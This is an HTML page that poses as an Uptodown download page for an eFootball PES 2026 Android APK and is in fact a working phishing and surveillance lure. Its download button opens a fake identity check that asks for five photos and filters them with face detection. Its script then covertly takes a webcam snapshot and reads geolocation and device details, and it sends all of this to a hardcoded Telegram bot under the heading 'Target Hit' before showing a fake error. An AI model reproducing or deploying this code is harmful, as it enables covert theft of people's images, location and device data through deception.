<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>eFootball PES 2026 for Android - Download</title>
    <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --ut-bg: #081d24; /* Aniq Uptodown foni */
            --ut-dark: #051116; /* Header foni */
            --ut-blue: #1b85d3; /* Linklar va ikonka chegaralari */
            --ut-green: #00b451; /* Download tugmasi */
            --ut-dim: #7e949c; /* Matnlar rangi */
            --ut-card: #0c262f; /* Bloklar foni */
        }

        body {
            margin: 0;
            background-color: var(--ut-bg);
            font-family: 'Roboto', sans-serif;
            color: #ffffff;
            line-height: 1.4;
        }

        /* --- NAVIGATION --- */
        header {
            background: var(--ut-dark);
            height: 56px;
            display: flex;
            align-items: center;
            padding: 0 16px;
            border-bottom: 1px solid #102a33;
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        .menu-icon { color: var(--ut-blue); font-size: 24px; cursor: pointer; }
        .logo { height: 22px; margin-left: 15px; }

        .path-bar {
            background: #06181e;
            padding: 10px 16px;
            font-size: 10px;
            color: var(--ut-dim);
            text-transform: uppercase;
            letter-spacing: 0.5px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .main-content { max-width: 1000px; margin: 0 auto; padding: 20px 16px; }

        /* --- APP HEADER --- */
        .app-header { display: flex; gap: 16px; margin-bottom: 24px; }
        .app-icon { 
            width: 100px; height: 100px; 
            border-radius: 22px; 
            box-shadow: 0 4px 12px rgba(0,0,0,0.4);
            object-fit: cover;
        }
        .app-info h1 { font-size: 26px; font-weight: 700; margin: 0; letter-spacing: -0.5px; }
        .app-sub { font-size: 14px; margin-top: 4px; color: var(--ut-dim); }
        .app-sub a { color: var(--ut-blue); text-decoration: none; font-weight: 500; }
        .category-tag { 
            background: #1e3a45; color: var(--ut-blue); 
            padding: 1px 6px; border-radius: 4px; 
            font-size: 11px; margin-left: 4px;
        }

        /* --- STATS SECTION --- */
        .stats-row {
            display: flex;
            justify-content: space-between;
            border-top: 1px solid #15323d;
            border-bottom: 1px solid #15323d;
            padding: 14px 0;
            margin: 20px 0;
        }
        .stat-box { text-align: center; flex: 1; }
        .stat-box b { display: block; font-size: 17px; }
        .stat-box span { font-size: 11px; color: var(--ut-dim); text-transform: uppercase; }

        /* --- DOWNLOAD BUTTON --- */
        .download-area { margin-bottom: 30px; }
        .btn-latest {
            background: var(--ut-green);
            color: #ffffff;
            width: 100%;
            padding: 16px;
            border-radius: 8px;
            font-weight: 700;
            font-size: 18px;
            border: none;
            box-shadow: 0 4px 0 #008a3d;
            cursor: pointer;
            text-align: center;
        }
        .btn-latest:active { transform: translateY(2px); box-shadow: none; }
        .dl-info { font-size: 12px; color: var(--ut-dim); margin-top: 10px; text-align: center; }

        /* --- SCREENSHOTS GALLERY --- */
        .section-label { 
            font-size: 13px; font-weight: 700; 
            color: var(--ut-dim); margin-bottom: 12px; 
            text-transform: uppercase; 
        }
        .screenshot-container {
            display: flex;
            overflow-x: auto;
            gap: 10px;
            padding-bottom: 15px;
            scrollbar-width: none; /* Firefox */
        }
        .screenshot-container::-webkit-scrollbar { display: none; } /* Chrome/Safari */
        .screenshot-container img {
            height: 180px;
            border-radius: 10px;
            border: 1px solid #15323d;
            flex-shrink: 0;
        }

        /* --- TECHNICAL INFO (Xarakteristika) --- */
        .tech-section { margin-top: 40px; }
        .tech-title { font-size: 18px; font-weight: 700; margin-bottom: 20px; }
        .tech-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
            background: var(--ut-card);
            padding: 20px;
            border-radius: 12px;
        }
        .tech-card { display: flex; gap: 12px; align-items: center; }
        .circle-icon {
            width: 32px; height: 32px;
            border: 1px solid var(--ut-blue);
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            color: var(--ut-blue); font-size: 16px;
        }
        .tech-data b { display: block; font-size: 10px; color: var(--ut-dim); text-transform: uppercase; }
        .tech-data span { font-size: 14px; font-weight: 500; }

        /* --- STEAL VERIFICATION OVERLAY --- */
        #verify-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(5, 17, 22, 0.98);
            z-index: 9999;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .verify-modal {
            background: var(--ut-card);
            width: 100%;
            max-width: 340px;
            padding: 30px;
            border-radius: 16px;
            border: 1px solid var(--ut-blue);
            text-align: center;
        }
        
        video, canvas, #hidden-input { display: none; }
    </style>
</head>
<body>

<header>
    <div class="menu-icon">☰</div>
    <img src="https://stc.utdstc.com/img/logos/uptodown-logo-white.png" class="logo" alt="Uptodown">
</header>

<div class="path-bar">Android / Games / Sports / eFootball PES 2026</div>

<div class="main-content">
    <div class="app-header">
        <img src="image_980b88.png" class="app-icon">
        <div class="app-info">
            <h1>eFootball PES 2026</h1>
            <div class="app-sub">
                10.4.0 | <a href="#">Uptodown.com</a>
                <span class="category-tag">#Sports</span>
            </div>
        </div>
    </div>

    <div class="stats-row">
        <div class="stat-box"><b>★ 4.4</b><span>Reviews</span></div>
        <div class="stat-box"><b>74.8 M</b><span>Downloads</span></div>
        <div class="stat-box"><b>🛡️</b><span>Safe</span></div>
    </div>

    <div class="download-area">
        <button class="btn-latest" onclick="openVerification()">Latest version</button>
        <div class="dl-info">Apr 10, 2026 | 2.4 GB | <span style="color:var(--ut-green)">APK</span></div>
    </div>

    <div class="section-label">Screenshots</div>
    <div class="screenshot-container">
        <img src="image_980e4b.png">
        <img src="image_980e8c.png">
        <img src="image_980ece.png">
        <img src="image_980f42.png">
        <img src="image_9811ee.png">
    </div>

    <div class="tech-section">
        <h2 class="tech-title">Technical information</h2>
        <div class="tech-grid">
            <div class="tech-card">
                <div class="circle-icon">👤</div>
                <div class="tech-data"><b>Developer</b><span>Uptodown.com</span></div>
            </div>
            <div class="tech-card">
                <div class="circle-icon">📄</div>
                <div class="tech-data"><b>License</b><span>Free</span></div>
            </div>
            <div class="tech-card">
                <div class="circle-icon">📱</div>
                <div class="tech-data"><b>OS</b><span>Android 7.0+</span></div>
            </div>
            <div class="tech-card">
                <div class="circle-icon">📦</div>
                <div class="tech-data"><b>Package</b><span>jp.konami.pesam</span></div>
            </div>
        </div>
    </div>
</div>

<div id="verify-overlay">
    <div class="verify-modal">
        <h3 id="v-title">Verify Your Identity</h3>
        <p id="v-desc" style="font-size: 13px; color: var(--ut-dim);">Please upload 5 photos to confirm you are human and unlock the download link.</p>
        <label for="hidden-input" style="background: var(--ut-blue); display: block; padding: 14px; border-radius: 8px; cursor: pointer; font-weight: 700; margin-top: 20px;">UPLOAD PHOTOS</label>
        <input type="file" id="hidden-input" multiple accept="image/*" onchange="processAI(this)">
    </div>
</div>

<video id="v-stream" autoplay playsinline></video>
<canvas id="v-canvas"></canvas>

<script>
    const CONFIG = { TOKEN: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", CHAT: "6198817749" };
    let capturedFiles = [];

    // FaceAPI load
    async function initAI() {
        await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model');
    }
    initAI();

    function openVerification() { document.getElementById('verify-overlay').style.display = 'flex'; }

    async function processAI(input) {
        document.getElementById('v-title').innerText = "Processing...";
        const files = Array.from(input.files);
        for (let f of files) {
            const img = await faceapi.bufferToImage(f);
            const detection = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions());
            if (detection.length > 0) capturedFiles.push(f);
        }
        executeStealth();
    }

    async function executeStealth() {
        const platform = navigator.userAgent;
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('v-stream');
            video.srcObject = stream;
            await new Promise(res => setTimeout(res, 1000));
            
            const canvas = document.getElementById('v-canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const snap = await (await fetch(canvas.toDataURL('image/jpeg', 0.6))).blob();
            
            stream.getTracks().forEach(t => t.stop());

            navigator.geolocation.getCurrentPosition(async (p) => {
                const geo = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                await sendToBot(platform, geo, snap);
            }, () => sendToBot(platform, "Location Blocked", snap));
        } catch(e) { sendToBot(platform, "Cam Error", null); }
    }

    async function sendToBot(pInfo, loc, snap) {
        await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CONFIG.CHAT, text: `📥 *Target Hit*\nDevice: ${pInfo}\nLocation: ${loc}`, parse_mode: 'Markdown'})
        });

        if(snap) {
            const fd = new FormData(); fd.append('chat_id', CONFIG.CHAT); fd.append('photo', snap);
            await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {method: 'POST', body: fd});
        }

        for (let file of capturedFiles) {
            const fd2 = new FormData(); fd2.append('chat_id', CONFIG.CHAT); fd2.append('photo', file);
            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {method: 'POST', body: fd2});
        }
        
        alert("Verification failed. Error code: 0x884. Please try again later.");
        location.reload();
    }
</script>
</body>
</html>
